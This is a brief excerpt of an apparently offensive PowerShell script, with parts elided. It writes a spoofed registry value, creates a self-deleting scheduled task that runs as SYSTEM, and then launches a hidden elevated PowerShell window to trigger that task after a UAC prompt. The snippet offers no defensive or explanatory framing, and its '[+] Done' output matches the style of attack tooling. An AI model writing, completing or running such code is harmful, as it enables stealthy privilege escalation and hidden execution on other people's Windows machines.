...
Set-ItemProperty -Path $regPath -Name $regName -Value $spoofSource -Force
...
# 6. Create scheduled task (auto-delete with /Z)
schtasks /create /tn $taskName /ru SYSTEM /tr "$taskCmd" /sc ONCE /st 00:00 /Z | Out-Null

Write-Host "[+] Done. Triggering UAC prompt for elevation..."
Start-Process powershell -Verb RunAs -ArgumentList "-NoP -WindowStyle Hidden -C `"schtasks /run /tn $taskName`""
